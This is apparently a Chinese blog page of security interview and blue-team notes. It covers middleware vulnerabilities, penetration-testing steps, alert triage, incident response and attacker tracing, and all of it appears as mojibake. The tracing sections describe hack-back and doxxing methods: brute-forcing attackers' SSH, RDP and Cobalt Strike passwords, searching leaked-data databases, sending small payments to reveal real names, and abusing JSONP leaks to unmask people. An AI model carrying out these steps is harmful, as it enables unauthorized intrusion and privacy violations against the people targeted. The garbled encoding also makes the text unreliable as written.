<h2 id="å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´"><a href="#å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´" class="headerlink" title="å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´"></a>å¸¸è§çš„ä¸­é—´ä»¶æ¼æ´</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">PUT</span>æ¼æ´ã€çŸ­æ–‡ä»¶åçŒœè§£ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€è§£ææ¼æ´<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">è§£ææ¼æ´ã€ç›®å½•éå†<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">æ–‡ä»¶è§£æã€ç›®å½•éå†ã€<span class="token constant">CRLF</span>æ³¨å…¥ã€ç›®å½•ç©¿è¶Š<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">è¿œç¨‹ä»£ç æ‰§è¡Œã€waråé—¨æ–‡ä»¶éƒ¨ç½²<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ååºåˆ—åŒ–æ¼æ´ã€waråé—¨æ–‡ä»¶éƒ¨ç½²<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><pre class="line-numbers language-none"><code class="language-none">ååºåˆ—åŒ–æ¼æ´
SSRFä»»æ„æ–‡ä»¶ä¸Šä¼ 
waråé—¨æ–‡ä»¶éƒ¨ç½²<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h2 id="å†…å­˜é©¬æŸ¥æ‰¾"><a href="#å†…å­˜é©¬æŸ¥æ‰¾" class="headerlink" title="å†…å­˜é©¬æŸ¥æ‰¾"></a>å†…å­˜é©¬æŸ¥æ‰¾</h2><p><strong>windowsï¼š</strong>çœ‹çœ‹dllæ–‡ä»¶ï¼Œæ³¨å†Œè¡¨ï¼ŒæŸ¥çœ‹å¤–è”å¯ä»¥çš„vpsçš„åœ°å€ã€‚</p>
<p>**linux:**ä½¿ç”¨å‘½ä»¤è¿›è¡Œéå†ã€‚</p>
<h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="ç¡®å®šç›®æ ‡"><a href="#ç¡®å®šç›®æ ‡" class="headerlink" title="ç¡®å®šç›®æ ‡"></a>ç¡®å®šç›®æ ‡</h3><p>åœ¨æ‹¿åˆ°ä¸€ä¸ªurlæ—¶ï¼Œå…ˆç¡®å®šè‡ªå·±çš„æ¸—é€ç›®æ ‡ï¼Œæ˜¯è¦æµ‹è¯•æ•´ä¸ªç½‘ç«™è¿˜æ˜¯æŸä¸ªæ¨¡å—ã€‚è‡ªå·±è¦å¹²ä»€ä¹ˆé¦–å…ˆè¦æƒ³æ¸…æ¥šã€‚</p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>æ­¤é˜¶æ®µæ˜¯æ¸—é€æµ‹è¯•ä¸­æœ€åŸºç¡€ä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œä¿¡æ¯æ”¶é›†çš„å¤šå°‘ä¸€å®šç¨‹åº¦ä¸Šå†³å®šæ˜¯å¦èƒ½å¤Ÿæ¸—é€æˆåŠŸã€‚ä¿¡æ¯æ”¶é›†è¿‡ç¨‹ä¸­å¯ä»¥å€ŸåŠ©<strong>æœç´¢å¼•æ“</strong>ï¼ˆfofaï¼Œé’Ÿé¦—ä¹‹çœ¼ï¼‰è·å¾—ä¸€äº›é‡è¦ä¿¡æ¯ã€‚æ¯”å¦‚åå°ï¼Œæ•æ„Ÿçš„urlç­‰ã€‚</p>
<p>é€šè¿‡åŸŸåæ‰¾åˆ°IPï¼Œå­åŸŸåï¼Œæ—ç«™ï¼Œæ˜¯å¦å­˜åœ¨CDNã€‚<strong>ï¼ˆç«™é•¿å·¥å…·ï¼‰</strong></p>
<p>æ¢æµ‹ç½‘ç«™ç›¸å…³ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¦‚æœç½‘ç«™ç”¨äº†cmsï¼Œé‚£å°±æŸ¥æ‰¾cmsæŒ‡çº¹ï¼ŒæŸ¥æ‰¾è¯¥cmsæ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p>
<p><strong>æ—ç«™</strong>ï¼šä¸æœ¬ç½‘ç«™å…¬ç”¨ä¸€ä¸ªæœåŠ¡å™¨ã€‚</p>
<p><strong>Cæ®µï¼ˆæŠ¤ç½‘ä¸­è¾ƒæœ‰æ„ä¹‰ï¼‰</strong>ï¼šCæ®µæŒ‡çš„æ˜¯åŒä¸€å†…ç½‘æ®µå†…çš„å…¶ä»–æœåŠ¡å™¨ã€‚</p>
<p>ç­‰ç­‰ã€‚</p>
<h3 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h3><p>å¯¹ç½‘ç«™è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œå¯ä»¥ä½¿ç”¨ç›¸å…³å·¥å…·ï¼ˆä¸é—®ä¸è¯´ï¼šAWVS,Appscan,Nessussï¼‰ã€‚æ‰«æåˆ°æ¼æ´çš„è¯è¿›è¡Œæ¼æ´éªŒè¯åˆ©ç”¨ã€‚</p>
<p>é¡ºåˆ©çš„è¯æœ€ç»ˆæ‹¿åˆ°webshellã€‚</p>
<p>æµ‹è¯•ç»“æŸåæ€»ç»“æ•´ä¸ªæµç¨‹ï¼Œç»™ç›¸å…³æœºæ„æå‡ºä¿®å¤å»ºè®®ã€‚</p>
<h3 id="æ‹¿åˆ°ç½‘ç«™ç™»å½•æ¡†è¯¥æ€ä¹ˆä¸‹æ‰‹"><a href="#æ‹¿åˆ°ç½‘ç«™ç™»å½•æ¡†è¯¥æ€ä¹ˆä¸‹æ‰‹" class="headerlink" title="æ‹¿åˆ°ç½‘ç«™ç™»å½•æ¡†è¯¥æ€ä¹ˆä¸‹æ‰‹"></a>æ‹¿åˆ°ç½‘ç«™ç™»å½•æ¡†è¯¥æ€ä¹ˆä¸‹æ‰‹</h3><p>é¦–å…ˆåˆ†æç™»å½•æ¡†çš„å‚æ•°ã€‚</p>
<p>å°è¯•å¼±å£ä»¤ç™»å½•ï¼Œèƒ½å¤Ÿè¿›è¡Œçˆ†ç ´çš„è¯è¿›è¡Œçˆ†ç ´ã€‚</p>
<p>SQLæ³¨å…¥åœ¨ç™»é™†æ¡†ä¹Ÿå®¹æ˜“å‡ºç°ï¼Œå¦‚æœå­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„è¯é‚£å°±è¿›è¡Œæ”»å‡»ã€‚</p>
<h2 id="æº¯æºçš„æ€è·¯"><a href="#æº¯æºçš„æ€è·¯" class="headerlink" title="æº¯æºçš„æ€è·¯"></a>æº¯æºçš„æ€è·¯</h2><p>1.çº¢é˜Ÿæ”»å‡»éƒ½ä¼šæŒ‚ç€ä»£ç†ï¼Œä½ æº¯æºçš„è¯åªèƒ½æº¯æºåˆ°ä»–çš„ä»£ç†ipï¼Œæ²¡æœ‰å¤ªå¤§çš„æ„ä¹‰ï¼Œå¦‚æœè¯´æœåŠ¡å™¨è¢«ä¸Šäº†å†…å­˜é©¬çš„æƒ…å†µï¼Œå¯ä»¥å»å·¥å…·å–æ ·ä»–å†…å­˜é©¬çš„ipï¼Œå¯¹å†…å­˜é©¬ipåå‘æ‰«æç«¯å£ï¼Œ<br>å› ä¸ºä»–ä»¬ä¹Ÿæ˜¯é€šè¿‡è¿œç¨‹è¿›å»çš„ï¼Œå»çˆ†ç ´ä»–ä»¬çš„ssh,3389å’Œcsçš„å¯†ç ã€‚<br>1.ååºåˆ—åŒ–çš„å–æ ·ï¼Œä»–æ‰“shiroï¼Œé‡Œé¢å°±æœ‰ä»–çš„åŸºæœ¬è®¾å¤‡vpsï¼Œé€šè¿‡ä¸­é—´ä»¶å§è¿™äº›æœ‰ç‰¹å¾çš„ipæ”¶é›†ï¼Œæ”¾åˆ°åœ¨çº¿æƒ…æŠ¥å¹³å°ä¸Šè¯†åˆ«ï¼Œæ£€æµ‹æ˜¯ä¸æ˜¯æœ‰ipç»‘å®šåŸŸåçš„ï¼Œé€šè¿‡whoisåæŸ¥ä»–çš„åŸŸåæ³¨å†Œæ—¶é—´ã€é‚®ç®±ï¼Œé€šè¿‡ç¤¾å·¥åº“æŸ¥ä»–çš„æ‰‹æœºå·ï¼Œç„¶åé€šè¿‡ç¤¾äº¤è½¯ä»¶ï¼Œqqã€å¾®ä¿¡ã€æ”¯ä»˜å®æ¥ç»™ä»–è½¬ä¸€æ¯›é’±ï¼Œæ‹¼æ¥ä»–çš„ä¸ªäººä¿¡æ¯ã€‚</p>
<p>4.å·²ç»è¢«ä¸Šä¼ webshellåº”æ€¥<br>2.ç³»ç»Ÿå¦‚æœå·²ç»è¢«æ¤å…¥åé—¨ï¼Œè¯´æ˜æ”»å‡»è€…å·²ç»æ”»å‡»æˆåŠŸï¼Œè€Œä¸”æ‹¿åˆ°æƒé™ï¼Œè¿™æ—¶å€™æ—¥å¿—ä¿¡æ¯å¯èƒ½æä¾›ä¸äº†å¸®åŠ©ï¼Œé¦–å…ˆè¦å»è€ƒè™‘ç³»ç»Ÿçš„è´¦æˆ·æ˜¯å¦å®‰å…¨ï¼Œï¼Œåˆæ²¡å£ä»¤çˆ†ç ´æˆåŠŸçš„ç—•è¿¹ï¼Œæ’æŸ¥è´¦å·çš„å¯†ç æ˜¯å¦å·²ç»ä¸å®‰å…¨.<br>(Linux)çš„è¯çœ‹è®¡åˆ’ä»»åŠ¡,æœ‰æ²¡æœ‰å®šæ—¶åå¼¹shell,è¿˜æœ‰å°±æ˜¯è¿›ç¨‹æ˜¯ä¸æ˜¯å¯ç–‘åœ¨é€šä¿¡.å‘ç°å¯ç–‘é—®é¢˜,å°±è¦æ ·æœ¬åˆ†æ.<br>(windows)çš„è¯å°±çœ‹å¯åŠ¨é¡¹å’Œè¿›ç¨‹.<br>å¦‚æœæ˜¯webå…¥ä¾µ,çœ‹æ—¥å¿—webæœåŠ¡æ˜¯ä¸æ˜¯å®‰å…¨?è¿˜åŸæ”»å‡»çš„æµç¨‹.<br>5.æµé‡æº¯æº<br>1.å…ˆçœ‹æ—¥å¿—ï¼Œçœ‹æ”»å‡»æ—¶é—´åšä¸€ä¸ªå®¡è®¡ï¼Œæœç´¢è¿™ä¸ªæ—¶é—´æ–‡ä»¶ä¸Šä¼ çš„æ“ä½œï¼Œä¸€èˆ¬æ˜¯GETå’ŒPOSTä¸¤ç§ï¼ŒGETçš„è¯å¯ä»¥ç›´æ¥çœ‹åˆ°ä»–è¯·æ±‚çš„èµ„æºã€åœ°å€å’Œcontentï¼Œç„¶åwebshellè¯¥æ€å°±æ€ï¼Œåé—¨æ”¹è¡¥å°±è¡¥ï¼Œå¦‚æœæ˜¯POSTï¼Œé‚£ä¹ˆå°±çœ‹ä¸åˆ°è¯·æ±‚çš„å†…å®¹ï¼Œå¯ä»¥å»é˜²ç«å¢™ä¸Šä¸‹è½½å®Œæ•´æ•°æ®åŒ…æ¥åˆ†æã€‚</p>
<h2 id="æº¯æºååˆ¶çš„æ€è·¯ï¼Ÿ"><a href="#æº¯æºååˆ¶çš„æ€è·¯ï¼Ÿ" class="headerlink" title="æº¯æºååˆ¶çš„æ€è·¯ï¼Ÿ"></a><strong>æº¯æºååˆ¶çš„æ€è·¯ï¼Ÿ</strong></h2><p>1.æ”»å‡»æºæ•è·</p>
<ul>
<li>å®‰å…¨è®¾å¤‡æŠ¥è­¦ï¼Œå¦‚æ‰«æIPã€å¨èƒé˜»æ–­ã€ç—…æ¯’æœ¨é©¬ã€å…¥ä¾µäº‹ä»¶ç­‰</li>
<li>æ—¥å¿—ä¸æµé‡åˆ†æï¼Œå¼‚å¸¸çš„é€šè®¯æµé‡ã€æ”»å‡»æºä¸æ”»å‡»ç›®æ ‡ç­‰</li>
<li>æœåŠ¡å™¨èµ„æºå¼‚å¸¸ï¼Œå¼‚å¸¸çš„æ–‡ä»¶ã€è´¦å·ã€è¿›ç¨‹ã€ç«¯å£ï¼Œå¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡å’ŒæœåŠ¡ç­‰</li>
<li>é‚®ä»¶é’“é±¼ï¼Œè·å–æ¶æ„æ–‡ä»¶æ ·æœ¬ã€é’“é±¼ç½‘ç«™ URL ç­‰</li>
<li>èœœç½ç³»ç»Ÿï¼Œè·å–æ”»å‡»è€… IDã€ç”µè„‘ä¿¡æ¯ã€æµè§ˆå™¨æŒ‡çº¹ã€è¡Œä¸ºã€æ„å›¾çš„ç›¸å…³ä¿¡æ¯</li>
</ul>
<p> 2.æº¯æºååˆ¶</p>
<ul>
<li>IP å®šä½æŠ€æœ¯<br>æ ¹æ®IPå®šä½ç‰©ç†åœ°å€â€“ä»£ç†   IP<br>æº¯æºæ¡ˆä¾‹ï¼šé€šè¿‡ IP ç«¯å£æ‰«æï¼Œåå‘æ¸—é€æœåŠ¡å™¨è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆå®šä½åˆ°æ”»å‡»è€…ç›¸å…³ä¿¡æ¯</li>
<li>ID è¿½è¸ªæœ¯<br>ID è¿½è¸ªæœ¯ï¼Œæœç´¢å¼•æ“ã€ç¤¾äº¤å¹³å°ã€æŠ€æœ¯è®ºå›ã€ç¤¾å·¥åº“åŒ¹é…<br>æº¯æºæ¡ˆä¾‹ï¼šåˆ©ç”¨ ID ä»æŠ€æœ¯è®ºå›è¿½æº¯é‚®ç®±ï¼Œç»§ç»­é€šè¿‡é‚®ç®±åè¿½è¸ªçœŸå®å§“åï¼Œé€šè¿‡å§“åæ‰¾åˆ°ç›¸å…³ç®€å†ä¿¡æ¯</li>
<li>ç½‘ç«™ url<br>åŸŸå Whois æŸ¥è¯¢â€“æ³¨å†Œäººå§“åã€åœ°å€ã€ç”µè¯å’Œé‚®ç®±   â€“åŸŸåéšç§ä¿æŠ¤<br>æº¯æºæ¡ˆä¾‹ï¼šé€šè¿‡æ”»å‡» IP å†å²è§£æè®°å½•&#x2F;åŸŸåï¼Œå¯¹åŸŸåæ³¨å†Œä¿¡æ¯è¿›è¡Œæº¯æºåˆ†æ</li>
<li>æ¶æ„æ ·æœ¬åˆ†æ<br>æå–æ ·æœ¬ç‰¹å¾ã€ç”¨æˆ·åã€IDã€é‚®ç®±ã€C2 æœåŠ¡å™¨ç­‰ä¿¡æ¯â€“åŒæºåˆ†æ<br>æº¯æºæ¡ˆä¾‹ï¼šæ ·æœ¬åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‘ç°æ”»å‡»è€…çš„ä¸ªäºº ID å’Œ QQï¼ŒæˆåŠŸå®šä½åˆ°æ”»å‡»è€…</li>
<li>ç¤¾äº¤è´¦å·<br>åŸºäº JSONP è·¨åŸŸï¼Œè·å–æ”»å‡»è€…çš„ä¸»æœºä¿¡æ¯ã€æµè§ˆå™¨ä¿¡æ¯ã€çœŸå® IP åŠç¤¾äº¤ä¿¡æ¯ç­‰<br>åˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥æ‰¾åˆ°ç›¸å…³ç¤¾äº¤ç½‘ç«™çš„ jsonp æ¥å£æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œç›¸å…³ç½‘ç«™ç™»å½•æœªæ³¨é”€</li>
</ul>
<p> 3.æ”»å‡»è€…ç”»åƒ</p>
<ul>
<li>æ”»å‡»è·¯å¾„</li>
</ul>
<p>æ”»å‡»ç›®çš„ï¼šæ‹¿åˆ°æƒé™ã€çªƒå–æ•°æ®ã€è·å–åˆ©ç›Šã€DDOS ç­‰<br>ç½‘ç»œä»£ç†ï¼šä»£ç† IPã€è·³æ¿æœºã€C2 æœåŠ¡å™¨ç­‰<br>æ”»å‡»æ‰‹æ³•ï¼šé±¼å‰å¼é‚®ä»¶é’“é±¼ã€Webæ¸—é€ã€æ°´å‘æ”»å‡»ã€è¿‘æºæ¸—é€ã€ç¤¾ä¼šå·¥ç¨‹ç­‰</p>
<ul>
<li>æ”»å‡»è€…èº«ä»½ç”»åƒ</li>
</ul>
<p>è™šæ‹Ÿèº«ä»½ï¼šIDã€æ˜µç§°ã€ç½‘å<br>çœŸå®èº«ä»½ï¼šå§“åã€ç‰©ç†ä½ç½®<br>è”ç³»æ–¹å¼ï¼šæ‰‹æœºå·ã€qq&#x2F;å¾®ä¿¡ã€é‚®ç®±<br>ç»„ç»‡æƒ…å†µï¼šå•ä½åç§°ã€èŒä½ä¿¡æ¯</p>
<h2 id="ç ”åˆ¤çš„æ€è·¯ï¼Ÿ"><a href="#ç ”åˆ¤çš„æ€è·¯ï¼Ÿ" class="headerlink" title="ç ”åˆ¤çš„æ€è·¯ï¼Ÿ"></a><strong>ç ”åˆ¤çš„æ€è·¯ï¼Ÿ</strong></h2><p>1.é¦–å…ˆå¯¹<strong>æ”»å‡»çš„æ¥æº</strong>è¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯å†…å¯¹å†…ï¼Œå¤–å¯¹å†…è¿˜æ˜¯å†…å¯¹å¤–çš„æƒ…å†µã€‚</p>
<p>2.ä¾æ®è®¾å¤‡çš„å‘Šè­¦ä¿¡æ¯ç»“åˆå…·ä½“æƒ…å†µæ¥åˆ†æ<strong>æ”»å‡»è¡Œä¸ºçš„ç±»å‹</strong>ï¼Œæ¯”å¦‚è¯´å‘Šè­¦SQLæ³¨å…¥æ”»å‡»ï¼Œé‚£æˆ‘ä»¬å°±å»æŸ¥çœ‹ä¸€ä¸‹è¯·æ±‚æ•°æ®åŒ…é‡Œé¢æ˜¯å¦æœ‰å•å¼•å·ï¼ŒSELECTç­‰æ•æ„Ÿå­—ç¬¦ï¼Œè¿”å›æ•°æ®åŒ…é‡Œé¢æ˜¯å¦æœ‰SQLè¯­æ³•æŠ¥é”™ç­‰ä¿¡æ¯ï¼Œæœ‰çš„è¯å°±å¯ä»¥åˆæ­¥åˆ¤æ–­è¯¥æ”»å‡»è¡Œä¸ºæ˜¯SQLæ³¨å…¥æ”»å‡»ã€‚</p>
<p>3.ç„¶åå°±æ˜¯<strong>æ ¹æ®æ”»å‡»ç‰¹å¾æ¥åˆ†æ</strong>æ”»å‡»è¡Œä¸ºä½¿ç”¨äº†ä»€ä¹ˆæŠ€æœ¯æˆ–è€…è¯´å·¥å…·ï¼Œæ¯”å¦‚è¯´æ”»å‡»çš„é¢‘ç‡ï¼Œæ•°æ®åŒ…çš„ä¿¡æ¯ç­‰ç­‰ã€‚æ¯”å¦‚è¯´åœ¨ä½¿ç”¨AWVSæˆ–è€…APPSCANç­‰å·¥å…·åœ¨æ‰«æçš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½åœ¨è¯·æ±‚æ•°æ®åŒ…çš„user-agenté‡Œé¢å°±æœ‰ç›¸å…³çš„ä¿¡æ¯ã€‚åŒæ ·ç»“åˆå‘Šè­¦ä¿¡æ¯å’Œå…·ä½“æƒ…å†µæ¥åˆ¤æ–­æ”»å‡»è¡Œä¸ºçš„å±å®³ç¨‹åº¦ï¼Œæ¯”å¦‚è¯´æ£€æµ‹åˆ°å¤šæ¡æ”»å‡»æˆåŠŸå‘Šè­¦å’Œå†…å¯¹å†…åŠå†…å¯¹å¤–æ”»å‡»å‘Šè­¦ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å°½å¿«çš„äº¤ç»™åº”æ€¥ç»„äº†ã€‚</p>
<p>4.ç»“åˆè®¾å¤‡å‘Šè­¦ä¿¡æ¯åŠå…·ä½“æƒ…å†µ<strong>åˆ†ææ”»å‡»æ„å›¾</strong>ï¼Œæ¯”å¦‚è¯´æ”»å‡»è€…çš„ç›®æ ‡æ˜¯ä¸»ç«™è¿˜æ˜¯æ—ç«™ï¼Œæ˜¯ä¸»æœºè¿˜æ˜¯åŸŸæ§ï¼Œä¸åŒçš„æ”»å‡»æ„å›¾å¯¹äºåç»­çš„å¤„ç†ä¹Ÿä¸åŒã€‚</p>
<p>5.æœ€åæ ¹æ®æˆ‘ä»¬æŒæ¡çš„ä¿¡æ¯é‡‡<strong>å–ç›¸åº”çš„å¤„ç½®</strong>æ–¹å¼ï¼Œæ¯”å¦‚è¯´å‘Šè­¦ä¿¡æ¯æ˜¯è¯¯æŠ¥ï¼Œè¯´æ˜è®¾å¤‡éœ€è¦ç­–ç•¥ä¼˜åŒ–ï¼Œä¸éœ€è¦å¤„ç½®ã€‚å‘Šè­¦ä¿¡æ¯æ˜¯å°è¯•æ”»å‡»ï¼Œæš‚æ—¶å¯¹èµ„äº§æ²¡æœ‰å½±å“ï¼Œå°±éœ€è¦åç»­æŒç»­å…³æ³¨ï¼Œæ”»å‡»æˆåŠŸæ—¶èƒ½å¤Ÿåšåˆ°åŠæ—¶ä¸ŠæŠ¥ã€‚å¦‚æœå‘Šè­¦ç¡®è®¤ä¸æ˜¯è¯¯æŠ¥ï¼Œå¹¶ä¸”æ”»å‡»æˆåŠŸæ—¶ï¼Œæˆ‘ä»¬å°±éœ€è¦è¿…é€Ÿä¸ŠæŠ¥åŠæ—¶é‡‡å–åº”æ€¥å“åº”ã€‚</p>
<h2 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h2><h3 id="åº”æ€¥å“åº”åŸºæœ¬æµç¨‹"><a href="#åº”æ€¥å“åº”åŸºæœ¬æµç¨‹" class="headerlink" title="åº”æ€¥å“åº”åŸºæœ¬æµç¨‹"></a>åº”æ€¥å“åº”åŸºæœ¬æµç¨‹</h3><p>1.é¦–å…ˆåº”è¯¥æ˜¯<strong>ä¿¡æ¯æ”¶é›†</strong>ï¼Œæ¯”å¦‚è¯´å½±å“èŒƒå›´æœ‰å¤šå¤§ï¼Œäº‹ä»¶ç±»å‹æ˜¯ä»€ä¹ˆï¼Œæºå¤´ä¸»æœºå’Œæ”»å‡»æ„å›¾ï¼Œæ˜¯å¦éœ€è¦ä¿éšœä¸šåŠ¡ç­‰ç­‰ä¿¡æ¯ï¼Œè¿™ä¸€æ­¥å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´æœ‰æ•ˆçš„è¿›è¡Œä¸‹ä¸€æ­¥çš„é˜»æ–­æ”»å‡»è¡Œä¸ºã€‚</p>
<p>2.æ¥ä¸‹æ¥å°±æ˜¯<strong>ç»“åˆå·²çŸ¥çš„ä¿¡æ¯é˜»æ–­æ”»å‡»è¡Œä¸ºï¼Œä¿æŠ¤èµ„äº§</strong>ã€‚æ¯”å¦‚è¯´æ”»å‡»è¡Œä¸ºå±€é™äºæŸä¸ªç«™ç‚¹ï¼Œä¸”æœªé€ æˆè¾ƒå¤§æŸå¤±ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥å°æ‰æ”»å‡»è€…çš„IPæ¥ç¡®ä¿ä¸šåŠ¡çš„æ­£å¸¸è¿›è¡Œï¼Œå½“ç„¶ä¹‹åä¹Ÿè¦å¯¹è¿™ä¸ªç«™ç‚¹æœ‰ä¸€ä¸ªæŒç»­çš„å…³æ³¨ã€‚å¦‚æœæ˜¯æŸå°ä¸»æœºæ²¦é™·æˆ–è€…è¯´åŸŸæ§æœåŠ¡å™¨æ²¦é™·ï¼Œé‚£ä¹ˆè¿™å°±ç®—æ¯”è¾ƒé‡å¤§çš„æŸå¤±ï¼Œä¸ºäº†é¿å…æŸå¤±æ‰©å¤§ï¼Œåº”è¯¥åŠæ—¶å°†æ„ŸæŸ“è®¾å¤‡æ–­ç½‘å¤„ç†ã€‚å¦‚æœæœ‰å¤‡ä»½æœåŠ¡å™¨ï¼Œå¯ä»¥åˆ‡æ¢å¤‡ç”¨è®¾å¤‡æ¥ä¿éšœä¸šåŠ¡æ­£å¸¸ã€‚</p>
<p>3.<strong>å¯¹æ”»å‡»è¡Œä¸ºé˜»æ–­åéœ€è¦å¯¹æ•°æ®è¿›è¡Œä¿æŠ¤</strong>ï¼Œæ¯”å¦‚è¯´ä¿å­˜å¥½æµé‡ã€å¯ç–‘è¿›ç¨‹çš„å†…å­˜ã€å¤±é™·ç³»ç»Ÿé•œåƒã€æ¶æ„æ ·æœ¬ã€è®¾å¤‡çš„æ—¥å¿—ï¼Œè¿™ä¸€æ­¥å¯ä»¥æœ‰æ•ˆå¸®åŠ©æˆ‘ä»¬åç»­çš„æº¯æºå·¥ä½œã€‚</p>
<p>4.<strong>å®‰å…¨äº‹ä»¶å½±å“æ ¹é™¤</strong>ï¼Œå·¥å…·ç»“åˆæ‰‹å·¥ä»ç³»ç»Ÿç”¨æˆ·æ˜¯å¦æœ‰æ–°å¢ç”¨æˆ·ï¼Œè¿›ç¨‹ä¿¡æ¯ï¼Œè®¡åˆ’ä»»åŠ¡ï¼Œè‡ªå¯åŠ¨é¡¹ï¼Œæ³¨å†Œè¡¨ï¼Œç«¯å£çŠ¶æ€(æ˜¯å¦æœ‰å¯¹å¤–è¿æ¥)ç­‰æ–¹é¢æ¥æ£€æŸ¥æ˜¯å¦æœ‰å¯ç–‘è¡Œä¸ºï¼Œæ¯”å¦‚è¯´ç«ç»’å‰‘ï¼ŒProcessHackerç­‰ä¸“é—¨ç”¨äºåˆ†æè¿™äº›æ–¹é¢çš„å·¥å…·ã€‚å¦‚æœæœ‰å°±ç›´æ¥å…³é—­æˆ–è€…åˆ é™¤ï¼Œæœ‰ä¸€äº›é¡½å›ºè¿›ç¨‹æˆ–è€…é¡½å›ºæ–‡ä»¶æ— æ³•å…³é—­æˆ–è€…åˆ é™¤å¯ä»¥ç»“åˆä¸“æ€å·¥å…·å¤„ç†ï¼Œæ¯”å¦‚è¯´Rkhunter,ç«ç»’ç­‰å·¥å…·ã€‚</p>
<p>5.<strong>æ¢å¤ä¸šåŠ¡</strong>ï¼ŒåŠ å¼ºå®‰å…¨æªæ–½ï¼ŒåŠ å›ºç³»ç»Ÿç­‰ï¼Œæ¯”å¦‚è¯´æ›´æ–°è½¯ä»¶ç‰ˆæœ¬ï¼Œå®‰è£…å·²çŸ¥æ¼æ´çš„è¡¥ä¸ï¼Œå…³é—­æŸäº›ç«¯å£ç­‰ç­‰ï¼Œæš‚æ—¶æ²¡æœ‰è§£å†³åŠæ³•çš„å¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚å…³é—­æŸäº›æœåŠ¡ã€‚<br>6.æœ€åå°±æ˜¯è¾“å‡ºæŠ¥å‘Šï¼Œæ€»ç»“åæ€ã€‚</p>
<h3 id="åº”æ€¥å“åº”æ¡ˆä¾‹"><a href="#åº”æ€¥å“åº”æ¡ˆä¾‹" class="headerlink" title="åº”æ€¥å“åº”æ¡ˆä¾‹"></a>åº”æ€¥å“åº”æ¡ˆä¾‹</h3><p>æˆ‘æ‹¿ä¸ªä¹‹å‰çš„åº”æ€¥æ’æŸ¥æ¥è¯´å§ï¼Œå°±æ˜¯æˆ‘ä»¬è¿™è¾¹æ¥åˆ°é€šçŸ¥ä»–ä»¬å…¬å¸å‡ å°æœåŠ¡å™¨æœ‰é—®é¢˜ï¼Œè®©æˆ‘ä»¬å»æ£€æµ‹ã€‚ç„¶åçœ‹åˆ°æ˜¯windowsçš„æœºå­ï¼Œæœ¬åœ°ç”¨æˆ·å’Œç»„æ’æŸ¥çš„æ—¶å€™å‘ç°æ–°å»ºå¯ç–‘çš„ç”¨æˆ·ï¼Œç¡®å®šä¸»æœºæ˜¯æœ‰é—®é¢˜çš„ï¼Œå¯¹æ–¹å·²ç»æ‹¿åˆ°ä¸»æœºæƒé™,ç„¶åäº‹ä»¶ç®¡ç†å™¨æœ‰å¤§é‡çš„ç™»å½•æ—¥å¿—çˆ†ç ´ï¼Œé‡‡å–çš„æªæ–½æ˜¯ç›´æ¥åˆ é™¤å¯ç–‘çš„å’Œéšè—è´¦å·,æ’æŸ¥ç™»å½•æ—¥å¿—,ç¡®å®šç³»ç»Ÿè´¦å·å·²ç»ä¸å®‰å…¨,æ›´æ–°äº†ç®¡ç†å‘˜è´¦å·,å¯¹å¯åŠ¨é¡¹å’Œå¯ç–‘è¿›ç¨‹åšäº†æ¸…é™¤,å–äº†ä¸€ä»½æ ·æœ¬æ‹¿å»åˆ†æ,é€šå‘Šä¸Šçº§ç´§æ€¥ä¿®è¡¥webç«™ç‚¹çš„æ¼æ´.</p>
